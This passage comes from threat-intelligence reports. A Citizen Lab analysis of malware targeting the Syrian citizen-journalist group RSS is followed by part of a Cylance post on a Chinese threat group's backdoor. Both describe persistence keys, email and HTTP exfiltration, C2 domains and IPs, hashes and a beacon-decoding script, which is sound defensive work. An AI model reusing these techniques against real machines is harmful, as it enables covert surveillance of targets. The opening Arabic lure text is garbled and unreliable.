‫ﻟﻀﻮء‬+ ‫ﻂ‬ # ‫ ﻓﻲ ﺗﺴﻠ‬1‫ﻤ‬3‫ﻟﻤﺴﺎ‬+ 567‫ ﺑﻀﺮ‬ : ‫ﻻﻋﻼ‬+ > ‫ ﻧﻌﻤﻞ ﻓﻲ ﻣﺠﺎ‬+‫ﻦ ﻓﻲ ﻛﻨﺪ‬ # ‫ﻤ‬ # ‫ﻦ ﻣﻘ‬ # I6‫ﻤﺎﻧﺎ ً ﻣﻨﺎ ﻛﺴﻮ‬I+7 , ‫ﻟﺮﻗﺔ‬+ ‫ ﻓﻲ‬5‫ﺎ‬ # ‫ﻟﺤ‬+ ‫ﻗﻊ‬+‫ﺔ ﻟﻮ‬ # ‫ﻘ‬ # ‫ﻟﺤﻘ‬+ M6‫ﻟﺼﻮ‬+ > ‫ﺼﺎ‬I‫ﻟﻤﻘﺪﻣﺔ ﻹ‬+ ‫ﻛﻢ‬Q‫ﻮ‬R‫ﻟﺸﻜﺮ ﻟﺠ‬+ ‫ﺑﻌﺪ‬ 1‫ﻟﺮﻗ‬+ ‫ ﻓﻲ‬5‫ﺎ‬ # ‫ﻟﺤ‬+ ‫ﻗﻊ‬+7 > ‫ﺮ ﺻﺤﻔﻲ ﻣﻄﻮ > ﺣﻮ‬I‫ ﺗﻘﺮ‬Q+‫ ﺑﺈﻋﺪ‬ : ‫ ﻓﺈﻧﻨﺎ ﻧﻘﻮ‬ , Z‫ ﺑﺸﻜﻞ ﺧﺎ‬1‫ﻟﺮﻗ‬+7 : ‫ﺎ ﺑﺸﻜﻞ ﻋﺎ‬I6‫ ﻓﻲ ﺳﻮ‬5‫ﺎ‬ # ‫ﻟﺤ‬+ ‫ﻗﻊ‬+7 ‫ ﻋﻠﻰ‬ .
^‫ﻼ‬ $ ‫ﻹ‬+ ‫ ﻣﻨﻜﻢ‬+‫ﺮ ﻣﺒﺪء ` ﻧﺮﺟﻮ‬I‫ﻟﻰ ﺗﻘﺮ‬+ 1‫ﻟﺮﻗﺔ ﺑﺎﻻﺿﺎﻓ‬+ ‫ﻨﺔ‬I‫ﻄﺔ ﻟﻤﺪ‬I‫ ﺧﺮ‬Q+‫ﺚ ﻗﻤﻨﺎ ﺑﺈﻋﺪ‬ # ‫ ﺣ‬ , ‫ﺌﺔ‬ $ ‫ﻨﺎ ﻓﻲ ﺣﺎ > ﻛﺎﻧﺖ ﺧﺎ‬I‫ﻟﺘﻲ ﻟﺪ‬+ f‫ﻟﻤﻌﻠﻮﻣﺎ‬+ ‫ﺢ ﺑﻌﺾ‬ # ‫ﺻﻞ ﻣﻌﻜﻢ ﻟﺘﺼﺤ‬+‫ﻟﺬﻟﻚ ﻗﻤﻨﺎ ﺑﺎﻟﺘﻮ‬7 1‫ﺻﻞ ﻣﻌ‬+‫ﻟﺘﻮ‬+ ‫ﺘﻢ‬ # ‫ ﻟ‬ , ‫ﻟﻚ‬k ‫ﻜﻢ ﻣﺎﻧﻊ ﻣﻦ‬I‫ﻜﻦ ﻟﺪ‬I ‫ ﻓﻲ ﺣﺎ > ﻟﻢ‬1‫ﻟﺤﻤﻠ‬+ ‫ﻦ ﻋﻠﻰ‬ # ‫ﻟﻘﺎﺋﻤ‬+ ‫ﺣﺪ‬+ m‫ﺪﻧﺎ ﺑﺤﺴﺎ‬I7‫ ﺑﺘﺰ‬o‫ﺲ ﺑﻮ‬ # ‫ﻟﻔ‬+ ‫ﺟﺪﻛﻢ ﻋﻠﻰ‬+‫ ﻣﻨﻜﻢ ﻓﻲ ﺣﺎ > ﺗﻮ‬+‫ ﻛﻤﺎ ﻧﺮﺟﻮ‬ , ‫ﺗﻨﺎ ﺑﺄ ` ﺧﻄﺎء‬Q‫ﻗﺎ‬r7 ‫ﺎ‬R # ‫ﻋﻠ‬ ‫ﻟﺘﺎﻟﻲ‬+ ‫ﺑﻂ‬+‫ﻟﺮ‬+ ‫ﺮ ﻋﻠﻰ‬I‫ﺔ ﻟﻠﺘﻘﺮ‬ # ‫ﻟﻤﺒﺪﺋ‬+ 1‫ﻟﻨﺴﺨ‬+ ‫ﻼ^ ﻋﻠﻰ‬ $ ‫ﻻ‬+ ‫ﻤﻜﻨﻜﻢ‬I‫ﺑﺸﻜﻞ ﻣﺒﺎﺷﺮ‬http : //tempsend [ DOT ] com/ [ Redacted ] ‫ﺮ‬I‫ﻟﺘﻘﺪ‬+ ‫ﻣﻊ ﻛﻞ‬ [ Name Redacted ] .
We are unsure why the attacker specifically mentions Canada in the email lure .
However , it is well known that Syria ’ s extensive diaspora ( including in Canada ) regularly engages in advocacy , sometimes in coordination with groups within Syria .
Thus , the message is not on its face implausible .
However , we note that the attacker also attempts to social engineer the identity of individuals working with RSS , by requesting a personal Facebook page .
Analyzing the Malware .
The custom malware used in this attack infects a user who views the decoy “ slideshow , ” and beacons home with the IP address of the victim ’ s computer and details about his or her system each time the computer restarts .
Unlike Syrian regime-linked malware , it contains no Remote Access Trojan ( RAT ) functionality , suggesting it is intended for identifying and locating a target .
Further , because the malware sends data captured by the malware to an e-mail address , it does not require that the attackers maintain a command-and-control server online .
This functionality would be especially useful to an adversary unsure of whether it can maintain uninterrupted Internet connectivity .
Narrative of Infection .
Accessing the link provided in the malicious e-mail sends the user to a .zip file hosted on file-sharing site tempsend.com .
At the time of writing the file had been downloaded only 10 times .
Image 2 : Tempsend screenshot .
The file to be downloaded is “ slideshow.zip ” MD5 : b72e6678e79cc57d33e684528b5721bd This file contains slideshow.exe MD5 : f8bfb82aa92ea6a8e4e0b378781b3859 .
This file is a self-extracting archive with an icon intended to suggest to the victim that it is itself a slideshow .
When run , the file opens a slideshow of Google Earth screen captures to the victim , displaying a series of locations in Syria , and highlighting an “ ISIS HQ ” and other images showing the alleged locations of US airstrikes .
Examples of images in the slideshow as follows :
Infection and Data Collection .
When opened , the “ slideshow.zip ” file writes and executes several files :
C : \Users\ [ Username ] \AppData\Local\Temp\IXP000.TMP\AdobeR1.exe C : \Users\ [ Username ] \AppData\Local\Temp\IXP000.TMP\pictures.exe .
“ AdobeR1.exe ” is malicious , while “ pictures.exe ” is the genuine slideshow displayed to the victim .
When the slideshow is closed both AdobeR1.exe and pictures.exe are deleted .
The AdobeR1 file writes a series of executable files that perform information collection and communication functions , including :
C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\AdbrRader.exe C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\AdobeIns.exe C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\GoogleUpate.exe C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\GooglUpd.exe C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\nvidrv.exe C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\nvisdvr.exe C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\rundl132.exe C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\svhosts.exe C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\nvidrv.exe .
Program Sequence .
The program sequence of data collection and sending is somewhat unusual , with each program performing a single task and communicating via markers left in the registry .
Programs appear to make use of the Visual C++ Runtime Library .
First , the program nvidrv adds itself to autorun :
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run under name “ UpdAdbreader ” .
It also creates a series of registry keys that the individual programs use to communicate : Registry keys and programs using them :
rundl132.exe : DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K6F-DKV8J-FKVJI GVKBU\6nvisdvr.exe : DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K4F-DKV8J-FKVJI GVKBU\4GoogleUpate.exe : DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K3F-DKV8J-FKVJI GVKBU\3AdbrRader.exe : DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K2F-DKV8J-FKVJI GVKBU\2nvidrv.exe : DefaultKeyboard\User\F124-5KK83-F2IV9-FDN293\JIPC7-K2ODP-OFnD3-FJCC3\J1K1F-DKV8J-FKVJI-GVKBU\1 Sets name “ 1 ” to StartupInfo structure as a string , e.g .
“ 0x3110x611 ” .
It then runs GooglUpd , which cleans up the program files if they exist , and runs AdbrRader .
AdbrRader ( communicating through registry key “ 2 ” ) writes the file vgadmysadm.tmp with the name of another registry key “ 2 ” with startup info .
C : \Users\ [ Username ] \AppData\Local\Microsoft\Windows\win32.tmp\ vgadmysadm.tmp .
Next , nvidrv runs GoogleUpate , which collects system information and writes it to :
C : \Users\ [ Username ] \AppData\Local\Microsoft\Windows\win32.tmp\vg2sxoysinf.tmp .
Then nvidrv runs nvisdvr ( registry key “ 4 ” ) that collects a list of running processes , which are written to :
C : \Users\ [ Username ] \AppData\Local\Microsoft\Windows\win32.tmp\v2cgplst.tmp .
Finally , nvidrv runs svhosts , which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com .
It then runs rundl132 if it has not before , by checking whether registry key name “ 6 ” is present .
It sets the key to “ 0 ” and runs it .
Next , “ rundl132.exe ” performs an HTTP GET request to myexternalip.com and collects the external IP of the infected machine :
GET /raw HTTP/1.1 Host : myexternalip.com Cache-Control : no-cacheHTTP/1.1 200 OK Server : nginx/1.6.2 Content-Type : text/html ; charset=utf-8 Transfer-Encoding : chunked Connection : close Date : [ REDACTED ] My-External-Ip : [ REDACTED ] f [ REDACTED ] 0 .
Next , rundl132 writes :
C : \Users\ [ Username ] \AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.IE5\Q7B90TFG\raw [ 1 ] .txt .
Then rundl132 writes the external IP to :
C : \Users\ [ Username ] \AppData\Local\Microsoft\Windows\win32.tmp\vgosysaext.tmp .
Finally , rundl132 runs AdobeIns , which zips the contents of the win32.tmp folder .
Program “ AdobeIns.exe ” takes the files written by the other programs and zips them in an encrypted , password protected file :
C : \Users\ [ Username ] \AppData\Local\Microsoft\Windows\win32.tmp\drv.sys\mxtd .
Data Transmission .
Data is transmitted by e-mail to an account presumably controlled by the attacker .
AdobeIns connects to an account at the online e-mail provider inbox.com via smtp using hardcoded credentials .
The malware then sends an e-mail to the same inbox containing the text “ Hello ” and with mxtd file attached .
SMTP traffic generated by the malware to inbox.com ( with redactions ) .
220 [ REDACTED ] ESMTP Postfix EHLO [ REDACTED ] 250- [ REDACTED ] 250-PIPELINING 250-SIZE 10240000 250-VRFY 250-ETRN 250-ENHANCEDSTATUSCODES 250-8BITMIME 250 DSN MAIL FROM : < [ REDACTED ] @ inbox.com > 250 2.1.0 Ok RCPT TO : < [ REDACTED ] @ inbox.com > 250 2.1.5 Ok DATA 354 End data with .
Date : [ REDACTED ] From : < [ REDACTED ] @ inbox.com > X-Priority : 3 ( Normal ) To : < [ REDACTED ] @ inbox.com > Subject : repo MIME-Version : 1.0 Content-Type : multipart/mixed ; boundary= ” __MESSAGE__ID__ [ REDACTED ] ” –__MESSAGE__ID__ [ REDACTED ] Content-type : text/plain ; charset=US-ASCII Content-Transfer-Encoding : 7bitHello –__MESSAGE__ID__ [ REDACTED ] Content-Type : application/x-msdownload ; name= ” mxtd ” Content-Transfer-Encoding : base64 Content-Disposition : attachment ; filename= ” mxtd ” [ REDACTED ] –__MESSAGE__ID__ [ REDACTED ] – .
250 2.0.0 Ok : queued as [ REDACTED ] QUIT 221 2.0.0 Bye .
Evaluation of the Malware ’ s Functionality .
The malware seen in this case study is unusual as it relies on a half-dozen separate executable files , each with a single task , and each communicating via markers dropped in the Registry .
The malware is also interesting because it does not provide remote access , but only sends an e-mail containing the victim ’ s IP address and miscellaneous system information .
The malware resends the information each time the computer is restarted , but it does not refresh the sent information on restart ( which may be a bug ) .
This behaviour strongly suggests that the function of this malware is to serve as a beacon .
The system information could be used to identify processes to exploit in the future , however since the attacker has already triggered the execution of a file on the victim ’ s system , it is surprising that more was not taken , or that a RAT ( custom or widely available ) was not used .
A RAT would have provided much greater access alongside IP information By not providing remote access and other RAT functionality , the program looks less like malware , and may attract less attention from endpoint protection tools and scanners .
Detections were low when the file was first submitted to VirusTotal , for example .
It registered only 6/55 detections by anti virus scanners , or a 10 % detection rate .
Transmitting the malware via e-mail also provides a degree of obscurity , and has the additional advantage of providing a layer of abstraction between the attacker and the target : there is no need to maintain a RAT command-and-control server .
The malware transmits autonomously , leaving the material in an inbox for the attacker to collect at a later time .
The malware has no obfuscation processes and is not highly technical in its development or interaction with Windows .
Nevertheless , we believe that the author of the program is aware of certain techniques to reduce the visibility of malware on a network , including transmitting data via encrypted e-mail communications .
However , the attacker has not correctly implemented encrypted e-mail : the malware will not attempt to use a TLS connection in certain cases .
As a result , account login credentials may be readily available in network traffic .
In addition , the malware uses the old PKWARE implementation of zip encryption , which is not particularly secure .
The password for the zipped file is also present in the binary without encryption or obfuscation .
Targeted Threats Index .
Citizen Lab researchers have developed the Targeted Threat Index ( TTI ) as a tool to standardize information about the sophistication of targeted threats against civil society groups in our research .
The index captures information about the level of social engineering used ( “ Targeting Sophistication ” ) , and adds a Technical Sophistication value for the attack as a multiplier .
This attack , which has little technical sophistication ( i.e. , it uses no exploits , code obfuscation , or techniques to frustrate reversing , etc . ) , nevertheless has carefully developed social engineering in the seeding materials and bait document .
Taken together it rates a 3 for Targeting Sophistication and a 1.25 for Technical Sophistication by our metric , yielding a TTI score of 3.75 .
Citizen Lab research using the TTI has found that , despite low levels of technical sophistication , with well-crafted social engineering malware attacks remain highly effective against civil society groups .
More information is available about the TTI in a recent Usenix Security paper .
Attribution .
There are at least three possible sources for this malware attack :
Pro-regime / regime-linked malware groups ISIS-linked hackers Other , unknown actors .
We evaluate each of these possibilities in turn , drawing on the information available to us after almost three years of tracking regime-linked malware .
Pro-Regime / Regime-Linked Groups .
Pro-regime malware actors have continually targeted the Syrian opposition with waves of malware since at least late 2011 .
Those campaigns have been extensively reported on by a range of groups , including Kaspersky , FireEye , Citizen Lab , the Electronic Frontier Foundation , and many others .
Regime-linked malware has a number of common features that typically serve as distinguishing characteristics : Social engineering focusing on the needs and interests of the opposition .
Although targeted , the malware seeding often aims at classes of people ( e.g. , people interested in ‘ shocking ’ news about a fighter , or ‘ leaked ’ information about the Assad regime ) rather than carefully written spear phishing targeting a single individual or small group .
Use of widely available RATs ( njRAT , Xtreme Rat , ShadowTech Rat , DarkComet RAT , and Blackshades RAT , among others ) .
At least one command-and-control server located within Syrian IP space ( often from a limited range of addresses ) .
Frequent use of Dynamic DNS providers like no-ip .
Use of “ crypters ” to obscure the binary .
These characteristics are not all present in every sample , but we have typically found one or more in almost every binary we have examined that is Syrian regime-linked .
This malware attack differs from known regime-linked groups in each of these elements .
Not only is it exceptionally targeted , but it is also not a commonly available RAT .
Nor does it have RAT functionality .
The function of the malware appears to be : identify and unmask the IP address of target ( s ) , and resend them to the attacker with each reboot .
In addition , data is sent to an Internet e-mail address , and no crypter is used to obscure the binary .
We are aware of only one previous case in Syria in which e-mail was used to transmit data , and that we believed was regime linked .
That incident , observed in 2012 , also used hardcoded e-mail to exfiltrate .
However , that malware had substantially more functionality than this case : not only did it drop a second stage from a compromised site , but was also included a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype .
The lack of overlap in Tactics , Techniques , and Procedures ( TTPs ) between this attack and prior attacks does not rule out Syrian regime-linked attackers .
It is possible that regime-linked groups are trying a new approach .
However , given that known regime-linked groups continued to remain active during the same date range using familiar TTPs , this scenario seems unlikely .
In addition , it would be strange for regime-linked malware groups to undertake significant effort to prepare and send an implant that has significantly less functionality than what they commonly use .
Taken together , we find this evidence supports the hypothesis that familiar regime-linked groups did not conduct the attack .
ISIS-linked Hackers .
RSS operates in territory controlled by ISIS , and has faced extensive targeting by ISIS .
Currently , they appear to be directly targeted by ISIS for kidnappings and other retaliation , including executions .
In addition , ISIS supporters have explicitly suggested that the group is under surveillance and actively hunted .
Together this evidence suggests that ISIS has a strong motivation for using social engineering and/or malware to locate the members of RSS .
We think there are several features of the malware attack that align with the needs and constraints of ISIS and its supporters in Ar-Raqqah , more so than other groups , as we understand them .
For example : The malware beacons location but does not provide RAT functionality .
The seeding attempts to obtain a ‘ private ’ Facebook identity from RSS through social engineering .
The malware exfiltrates to an online e-mail account , thus not requiring the attacker to maintain a command-and control server online .
The social media activity of members of RSS is often highly public .
Their location and exact membership , however , is secret .
We speculate that if an attacker were interested in maintaining long-term surveillance of the activities of RSS they could have employed a RAT .
However , if the attacker were interested in unmasking the location of its targets so they could be physically tracked down , collecting IP data and system info would be a more reasonable approach .
ISIS or its supporters clearly have a strong interest in the ( rudimentary ) location tracking of the members of RSS that this malware provides .
Internet connectivity in Raqqah is extremely limited , and some of it is under ISIS control .
Knowing the IP address of a target could quickly narrow down targets to specific locations , and specific Internet services , or Internet cafes in Raqqah .
Given that the identities and locations of RSS members are closely guarded , such information would hold significant intelligence value for ISIS .
Armed with this kind of information , ISIS could physically harm people within Raqqah ( and it is also possible that they have the ability to operate in some capacity in border areas of Turkey ) .
Little is publicly known about the technical capabilities of ISIS and its supporters ; however , reports have begun to emerge suggesting that ISIS is interested in expanding its abilities .
In addition , ISIS has reportedly gained the support of at least one individual with some experience with social engineering and hacking : Junaid Hussain ( aka TriCk ) , a former member of teamp0ison hacking team .
While Mr .
Hussain and associates have reportedly made threats against Western governments , it is possible that he or others working with ISIS have quietly supported an effort to identify the targeted organization , which is a highly visible thorn in the side of ISIS .
Other Unknown Actors .
It is possible that the attack is the product of actors working for unknown purposes and targeting RSS .
Given the activities of RSS , however , it is unclear who this might be .
It is not possible , for example , to reject the theory that some unknown group within the FSA , or other groups opposing the Assad regime are responsible .
Citizen journalists in Ar-Raqqah were previously critical of arbitrary arrests carried out by non-ISIS groups in 2013 .
However , it is unclear why those groups , which no longer control Ar-Raqqah , would be interested in RSS in November 2014 .
It is likely that third party actors , including several intelligence services , are closely monitoring various actors in the conflict through a range of electronic means .
However , there is little reason to suggest that they would use a tailored but technically rudimentary attack to target RSS in particular .
Conclusion : ISIS Can ’ t Be Ruled Out .
After considering each possibility , we find strong but inconclusive circumstantial evidence to support a link to ISIS .
However , we are unable to connect this attack directly to ISIS , Mr .
Hussain , or other ISIS supporters .
If indeed ISIS or its supporters are responsible , it seems reasonable that such an offensive capability may still be in development .
We hope that publishing this report will draw attention to a new and concerning threat that includes ISIS critics among its targets .
If ISIS is responsible , while this attack targets in-country impediments to ISIS objectives , other targets may include ideological or military adversaries abroad .
Whether or not ISIS is responsible , this attack is likely the work of a non-regime threat actor who may be just beginning to field a still-rudimentary capability in the Syrian conflict .
The entry costs for engaging in malware attacks in a conflict like the Syrian Civil War are low , and made lower by the fact that the rule of law is nonexistent for large parts of the country .
In still other parts ( under regime control ) , malware attacks appear to be state sanctioned .
Attacks Targeting Civil Society .
Citizen Lab research into targeted digital threats against civil society confirms that civil society groups face grave threats from targeted malware attacks , despite being under-resourced to defend against them .
The case highlighted here is no exception : lack of IT and security resources have made it difficult for the Syrian opposition to address targeted and persistent digital threats against them .
In addition , if ISIS is indeed responsible , this case suggests how easy it is for belligerents in a conflict to begin fielding basic offensive digital capabilities , and how quickly the capabilities can be pointed at unarmed civil society groups .
Warning : Social Engineering Thrives in Syrian Context .
This attack was exceptionally targeted , and clearly reflected the work of an actor familiar with the operations of the targeted organization .
As most organizations working on issues surrounding Syria are aware , malware delivered with good social engineering is a constant source of danger .
This particular attack can be prevented by not opening files sent by unknown persons .
However , many attacks in Syria come from hijacked accounts and impersonate people known to the targets .
Social engineering remains an unsolved problem , and continues to compromise groups throughout the Syrian opposition and their supporters .
This attack reaffirms the dangers posed by social engineering attacks , whether they deliver phishing campaigns or malware .
The circumstantial evidence of ISIS involvement suggests that groups working on topics that ISIS considers a threat , and their partner organizations and supporters , should urgently examine their security policies and assess the possible risks to their operations , and the consequences of exposure of sensitive information to ISIS .
Even if the link to ISIS turns out to be incorrect , it is possible that this will be a threat in the future .
Individuals and groups at risk can also consult materials in Arabic provided by Cyber Arabs including a series of very accessible videos on digital security .
Indicators of Compromise .
The malware files .
Filename MD5 slideshow.zip b72e6678e79cc57d33e684528b5721bd slideshow.exe f8bfb82aa92ea6a8e4e0b378781b3859 .
Files dropped by the malware .
Filename and Path MD5 C : \Users\ [ Username ] \AppData\Local\Temp\IXP000.TMP\AdobeR1.exe aa6bcba23cd39c2827d72d33f5104856 ( note : folder and file deleted after slideshow closed ) C : \Users\ [ Username ] \AppData\Local\Temp\IXP000.TMP\pictures.exe ( note : eda83c8e4ba7d088593f22d56cf39d9f folder and file deleted after slideshow closed ) C : \Users\ 9d36e8e3e557239d7006d0bb5c2df298 [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\AdbrRader.exe C : \Users\ 1d5d8c5ce3854de61b28de7ca73093f1 [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\AdobeIns.exe C : \Users\ 55039dd6ce3274dbce569473ad37918b [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\GoogleUpate.exe C : \Users\ efdd9b96ae0f43f7d738ead2e1d5430c [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\GooglUpd.exe C : \Users\ 0e3eb8de93297f12b56de9fc33657066 [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\nvidrv.exe C : \Users\ 3eb6f95c321ace0e3b101fd7e2cdd489 [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\nvisdvr.exe C : \Users\ 84bbd592a212f5a84923e82621e9177d [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\rundl132.exe C : \Users\ [ Username ] \Microsoft\Windows\Z0xapp8T.tmp\ 13caa1c95e6610f2d5134174e1fb4fd0 svhosts.exe .
Cylance SPEAR Team : A Threat Actor Resurfaces .
May 13 , 2015 By Jon Gross ( http : //blog.cylance.com/author/jon-gross ) Share This : Attackers typically shut down campaigns or halt activity after they are exposed by security researchers , thereby creating the impression they have dropped off the map .
This often leads to a false sense of security within the community and perpetuates the idea that public exposure makes us all safer .
While the exposed activity is no longer observed , attackers simply continue in the background – evolving or altering their tactics to seamlessly continue operations with increasingly advanced malware .
So while potentially making us safer in the short-term , exposure often forces a Darwinian evolution in malware .
Several months ago I examined a malware-tainted Word document titled “ ISIS_twitter_list.doc . ” I didn ’ t think much of it and quickly moved on after a cursory analysis .
Yet I recently uncovered evidence that suggests it was the work of a well-known Chinese threat group .
This group is known to have targeted U.S .
government agencies , defense contractors , aerospace firms and foreign militaries since 2009 .
Until now , it was widely believed the actor 's activities had largely subsided in 2013 , following numerous public disclosures and detailed analyses of their backdoors .
Our technical analysis shows the group has remained active .
We are releasing this data to help victims identify and remediate the threat .
Click here ( http : //blog.cylance.com/spear-a-threat-actor resurfaces # mitigation ) to get to recommended mitigations , or for all the technical details read on : It all began with the MIME encoded document `` ISIS_twitter_list.doc '' , which exploited the familiar CVE-2012-0158 ( http : //www.cve.mitre.org/cgi-bin/cvename.cgi ? name=CVE-2012-0158 ) and was first uploaded to Virustotal from a user in India .
Other targets identified were predominantly located in Australia , New Zealand , Vietnam and the United States .
File Details Name ISIS_twitter_list.doc SHA256 6ba1d42c6493b18548e30bd60ca3d07a140d9d1945cf4e2b542e4a6d23913f40 File Size 146,338 bytes The first stage shellcode searches for the marker `` GfCv '' then checks the next four bytes are `` EF FE EC CE '' in the document then decodes the second stage shellcode using the four-byte XOR key `` 0x29F7C592 '' .
This second stage finds and decodes an encoded executable beginning at offset 0x33A2 .
The binary is encoded using a variable 4-byte XOR key that is generated by starting with the 4-byte key 0x7FFEFC00 ; this XOR key is then permutated every four bytes by rotating the first two bytes of the key by 0x1 and shifting the bits of the next two bytes right by 0x1 , so the next 4-byte XOR key in the series would be 0x3FFF7E00 .
It includes some logic to exclude XOR'ng any bytes that match 0x00000000 or the current 4 byte XOR key .
For the binary mathematically impaired like myself the 4-byte keys will eventually repeat in effect creating a 256-byte XOR key .
The decoded binary will be written to the filesystem as `` % APPDATA % \Microsoft\Systemcertificates\Certificates.ocx '' .
File Details Full File Path % APPDATA % \Microsoft\Systemcertificates\Certificates.ocx SHA256 9d838fd9d21778ed9dc02226302b486d70ed13d4b3d914a3b512ea07bf67e165 File Size 107,008 bytes Compile Time 2/4/2015 8:41:42 UTC The malware does not execute immediately after successful exploitation and instead just creates a Run key in the current user 's hive which will execute the next time the victim user accesses the system .
Registry Persistence Key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Certificates Registry Key Value Rundll32.exe `` % APPDATA % \Microsoft\SystemCertificates\Certificates.ocx '' , Setup The ocx file is actually a DLL and provides the attacker the ability to upload , download , enumerate , delete , search , and execute files as well as list drivers on the system .
The binary is designed to be called from its one exported function , `` Setup '' ; the Run key will ensure that whenever the victim user logs into the system the backdoor will execute .
The binary is configured to communicate to `` www.microsoftservices.proxydns.com `` on port 80 using standard HTTP POST and GET requests .
The domain at the time of this report resolved to the IP address , `` 103.229.125.157 `` .
Additionally the dynamic DNS domains `` fighthard.mooo.com `` and `` rampage.freetcp.com `` have both historically resolved to this IP address .
Example initial beacon request : GET /login ? wd=hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ== HTTP/1.1 User-Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 5.1 ; Trident/4.0 ; .NET CLR 2.0.50727 ; .NET CLR 3.0.4506.2152 ; .NET CLR 3.5.30729 ; .NET CLR 1.1.4322 ) Host : www.microsoftservices.proxydns.com Cache-Control : no-cache The above beacon request can be decoded by base64 decoding with this alphabet , `` ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_ '' .
Then RC4 decrypting the resulting string using the first four bytes of the payload as the decryption key .
The following python script will make this easy : from Crypto.Cipher import ARC4 .
import base64 , binascii , string def customb64decode ( s ) : newalphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_ ' oldalphabet = string.uppercase + string.lowercase + string.digits + `` +/ '' s = s.translate ( string.maketrans ( newalphabet , oldalphabet ) ) return base64.b64decode ( s ) req = `` hvJZkcIvKKupNRlsqI0aN6jZDTYPz6ZS9Q H5bCXiER37jqqCDzS3wIUulYOjyKHcDomZCD72mAc4fSCoHhJJ1UQliBkraMepzS5J3UUFUH nofoOgVM02UlCs4LJANIuZH90vM5KH_Ih59DdVRbgQ== '' unb64 = customb64decode ( req ) rc4 = ARC4.new ( unb64 [ 0:4 ] ) dec = rc4.decrypt ( unb64 [ 4 : : ] ) print dec .
Decoding the string will yield the following :
k:9C18CDFE s : masst h :
u :
o : win32.5.1.2600.2.1.Service Pack 3 m : < MAC ADDRESS > .
Where k : is a unique identifier for the victim , s : is a campaign identifier included in the backdoor , h : is the hostname of the victim computer , u : is the victim user , o : is the operating system and service pack level , and m is the mac address .
Based upon some cursory analysis the backdoor will look for encrypted commands within HTML comments returned from the C2 using the following format : `` < ! ­­ ? * $ @ COMMAND GOES HERE @ $ * ? ­­ ! > ; '' however , the C2 was not active at the time of analysis so this could not be confirmed .
The backdoor may also make requests to the C2 over HTTP using the following parameters in the URI string `` query ? sid= '' and `` result ? sid= '' .
The PDB path , C : \Codes\Eoehttp\Release\Eoehttp.pdb , was also left in the backdoor although no other instances of this path could be identified .
Several additional exploit documents were identified by investigating the domains `` fighthard.mooo.com `` and `` rampage.freetcp.com `` .
Down the Intelligence Rabbit Hole .
Fighthard.mooo.com additionally resolved to 173.224.214.12 in February of 2014 .
The following exploit documents were identified to contain a payload which communicated to this domain : Naval Science Curriculum 2014.doc 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c 1.doc c593a844a87b3e40346efd5d314c55c5094d5bf191f9bb1aeec8078f6d07c0cd Republic Day speech 27 Jan 2014.doc 3219767408bba3fa41b9ab5f964531cf608fb0288684748d6ac0b50cf108c911 Rampage.freetcp.com still resolves to 103.229.125.157 as of 4/2/2015 Let 's go ahead and take a look further into one of the other expoit documents , 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c .
SHA256 8794189aad922f2287a56c5e2405b9fd8affd136286aad7ed893b90cd2b76b9c Name Naval Science Curriculum 2014.doc File Size 459,087 The document exploits old faithful , CVE-2012-0158 ( http : //www.cve.mitre.org/cgi-bin/cvename.cgi ? name=CVE-2012-0158 ) , but instead of using a MIME encoded document this file was just a plain RTX document .
Yes that 's not a misspelling Word is happy to open this RTF format as well .
So for anyone exploring and hunting RTF documents you may also want to start looking for the `` { \rtx '' header .
We 'll skip the shellcode analysis for now and go directly to the binary which is stored beginning at offset 0x1BC27 as an ASCII hex-encoded , xor-encoded binary .
It can be decoded using the XOR key `` 0xBF '' .
Upon successful exploitation the decoded binary will be written first to % TEMP % \dw20.EXEthen copied to % WINDIR % \msascm32.drv .
No other changes are made to the system .
File Details Full File Path : % WINDIR % \msacm32.drv SHA256 : 67bd81f4c5e129d19ae71077be8b68dc60e16c19019b2c64cdcedca1f43f0ae3 File Size : 108,544 Bytes Compile Time : 9/26/2013 01:46:23 UTC I 'm always curious when no registry changes are made in the exploitation process .
At first the backdoor failed to load or really do anything in my VM until I read what the `` msascm32.drv '' file does .
Looking at the original file 's ( % WINDIR % \system32\msacm32.drv ) imported functions , it 's clear the DLL is responsible for some type of audio processing and/or playback .
A quick search on the internet confirmed this so I added a soundcard to my VM .
